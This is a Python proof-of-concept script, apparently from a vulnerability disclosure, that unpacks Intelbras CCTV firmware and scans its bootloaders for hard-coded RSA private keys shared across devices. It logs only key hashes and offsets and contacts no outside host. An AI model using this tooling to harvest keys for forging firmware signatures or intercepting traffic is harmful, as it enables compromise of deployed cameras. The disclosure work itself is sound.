#!/usr/bin/env python3
"""PoC INTELBRAS-2026-001: RSA Private Key Extraction from Bootloader.

Extracts embedded RSA private keys from Intelbras CCTV firmware bootloaders
(u-boot.bin.img / dhboot.bin.img). These keys are shared across product lines
and can be used to forge firmware signatures or perform MITM attacks.

Author: André Henrique (@mrhenrike) | União Geek — https://github.com/Uniao-Geek
Date: 2026-04-18
CVSS: 9.8 CRITICAL — CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
CWE: CWE-321 (Use of Hard-coded Cryptographic Key)
"""

import os
import re
import sys
import json
import zipfile
import hashlib
import subprocess
from pathlib import Path
from datetime import datetime, timezone


_project_tmp = os.path.join(os.path.dirname(__file__), "..", "..", "..", ".tmp")
os.makedirs(_project_tmp, exist_ok=True)


PEM_FULL_PATTERN = re.compile(
    rb"(-----BEGIN (?:RSA )?(?:PRIVATE|PUBLIC) KEY-----"
    rb"[\s\S]*?"
    rb"-----END (?:RSA )?(?:PRIVATE|PUBLIC) KEY-----)"
)

PEM_HEADER_PATTERN = re.compile(
    rb"-----BEGIN (?:RSA )?(?:PRIVATE|PUBLIC) KEY-----"
)

BOOTLOADER_NAMES = {"u-boot.bin.img", "dhboot.bin.img"}

EVIDENCE_DIR = Path(__file__).parent / ".." / "evidence"


def sha256_bytes(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


def extract_keys_from_binary(data: bytes, source_label: str) -> list[dict]:
    keys = []

    for m in PEM_FULL_PATTERN.finditer(data):
        pem = m.group(0)
        try:
            pem_str = pem.decode("ascii", errors="replace")
        except Exception:
            pem_str = pem.hex()[:200]

        key_type = "UNKNOWN"
        if b"RSA PRIVATE" in pem:
            key_type = "RSA_PRIVATE"
        elif b"PRIVATE KEY" in pem:
            key_type = "PRIVATE"
        elif b"RSA PUBLIC" in pem:
            key_type = "RSA_PUBLIC"
        elif b"PUBLIC KEY" in pem:
            key_type = "PUBLIC"

        keys.append({
            "type": key_type,
            "offset": m.start(),
            "length": len(pem),
            "sha256": sha256_bytes(pem),
            "source": source_label,
            "pem_header": pem_str.split("\n")[0],
            "detection": "full_pem",
        })

    if not keys:
        for m in PEM_HEADER_PATTERN.finditer(data):
            header = m.group(0)
            header_str = header.decode("ascii", errors="replace")

            key_type = "UNKNOWN"
            if b"RSA PRIVATE" in header:
                key_type = "RSA_PRIVATE"
            elif b"PRIVATE KEY" in header:
                key_type = "PRIVATE"
            elif b"RSA PUBLIC" in header:
                key_type = "RSA_PUBLIC"
            elif b"PUBLIC KEY" in header:
                key_type = "PUBLIC"

            context = data[m.start():min(m.start() + 256, len(data))]
            keys.append({
                "type": key_type,
                "offset": m.start(),
                "length": 0,
                "sha256": sha256_bytes(context),
                "source": source_label,
                "pem_header": header_str,
                "detection": "header_only",
                "note": "PEM header found but END marker not adjacent (key in compressed/packed section)",
            })

    return keys


def analyze_firmware_zip(zip_path: str) -> dict:
    results = {
        "firmware_file": os.path.basename(zip_path),
        "firmware_sha256": sha256_bytes(Path(zip_path).read_bytes()),
        "analysis_date": datetime.now(timezone.utc).isoformat(),
        "bootloader_files_found": [],
        "keys_extracted": [],
    }

    work_dir = os.path.join(_project_tmp, "poc001_" + Path(zip_path).stem)
    os.makedirs(work_dir, exist_ok=True)

    with zipfile.ZipFile(zip_path, "r") as zf:
        zf.extractall(work_dir)

    for root, _, files in os.walk(work_dir):
        for fname in files:
            fpath = os.path.join(root, fname)
            is_bootloader = fname in BOOTLOADER_NAMES
            is_firmware_bin = fname.endswith((".bin", ".img"))

            if is_bootloader or is_firmware_bin:
                try:
                    data = Path(fpath).read_bytes()
                except (OSError, FileNotFoundError) as e:
                    print(f"[!] Cannot read {fname}: {e}")
                    continue
                if is_bootloader:
                    results["bootloader_files_found"].append({
                        "name": fname,
                        "size": len(data),
                        "sha256": sha256_bytes(data),
                    })
                keys = extract_keys_from_binary(data, fname)
                results["keys_extracted"].extend(keys)
                if keys:
                    print(f"[+] Found {len(keys)} key(s) in {fname}")
                    for k in keys:
                        print(f"    Type: {k['type']}, Offset: {k['offset']:#x}, "
                              f"Detection: {k['detection']}")

    if not results["keys_extracted"]:
        try:
            for root, _, files in os.walk(work_dir):
                for fname in files:
                    if fname.endswith((".bin", ".img")):
                        fpath = os.path.join(root, fname)
                        binwalk_out = os.path.join(work_dir, f"_binwalk_{fname}")
                        os.makedirs(binwalk_out, exist_ok=True)
                        subprocess.run(
                            ["binwalk", "-e", "-C", binwalk_out, fpath],
                            capture_output=True, timeout=120,
                        )
                        for broot, _, bfiles in os.walk(binwalk_out):
                            for bf in bfiles:
                                bfpath = os.path.join(broot, bf)
                                try:
                                    bdata = Path(bfpath).read_bytes()
                                    keys = extract_keys_from_binary(
                                        bdata, f"binwalk:{fname}/{bf}"
                                    )
                                    results["keys_extracted"].extend(keys)
                                    if keys:
                                        print(f"[+] Found {len(keys)} key(s) in "
                                              f"extracted {bf}")
                                except Exception:
                                    pass
        except FileNotFoundError:
            print("[!] binwalk not found — skipping deep extraction")

    return results


def cross_compare_keys(all_results: list[dict]) -> dict:
    """Compare extracted key hashes across firmware images to detect reuse."""
    key_map: dict[str, list[str]] = {}
    for r in all_results:
        for k in r["keys_extracted"]:
            h = k["sha256"]
            label = f"{r['firmware_file']}:{k['source']}"
            key_map.setdefault(h, []).append(label)

    shared = {h: locs for h, locs in key_map.items() if len(locs) > 1}
    return {
        "total_unique_keys": len(key_map),
        "shared_keys": len(shared),
        "shared_key_details": shared,
        "conclusion": (
            "CRITICAL: Same cryptographic keys found across multiple firmware images. "
            "Key compromise on one device compromises all devices sharing the key."
            if shared else
            "Keys found but no cross-firmware sharing detected in this sample."
        ),
    }


def main():
    fw_dir = os.path.join(
        os.path.dirname(__file__), "..", "..", "..",
        "downloads", "cctv", "intelbras",
    )

    if not os.path.isdir(fw_dir):
        print(f"[!] Firmware directory not found: {fw_dir}")
        print("[*] Usage: python poc_001_rsa_key_extraction.py")
        print("[*] Expects firmware ZIPs in downloads/cctv/intelbras/")
        sys.exit(1)

    zips = sorted(Path(fw_dir).glob("*.zip"))
    if not zips:
        print(f"[!] No ZIP files found in {fw_dir}")
        sys.exit(1)

    print(f"[*] Analyzing {len(zips)} firmware images for embedded crypto keys...")
    all_results = []
    for zp in zips:
        print(f"\n{'='*60}")
        print(f"[*] Analyzing: {zp.name}")
        result = analyze_firmware_zip(str(zp))
        all_results.append(result)
        print(f"    Bootloaders: {len(result['bootloader_files_found'])}")
        print(f"    Keys found:  {len(result['keys_extracted'])}")

    comparison = cross_compare_keys(all_results)
    print(f"\n{'='*60}")
    print("[*] Cross-firmware key comparison:")
    print(f"    Unique keys: {comparison['total_unique_keys']}")
    print(f"    Shared keys: {comparison['shared_keys']}")
    print(f"    {comparison['conclusion']}")

    output = {
        "poc_id": "INTELBRAS-2026-001",
        "title": "RSA Private Key Extraction from Bootloader",
        "results": all_results,
        "cross_comparison": comparison,
    }

    os.makedirs(EVIDENCE_DIR, exist_ok=True)
    out_path = EVIDENCE_DIR / "poc_001_results.json"
    with open(out_path, "w", encoding="utf-8") as f:
        json.dump(output, f, indent=2, ensure_ascii=False)
    print(f"\n[+] Results saved to {out_path}")


if __name__ == "__main__":
    main()
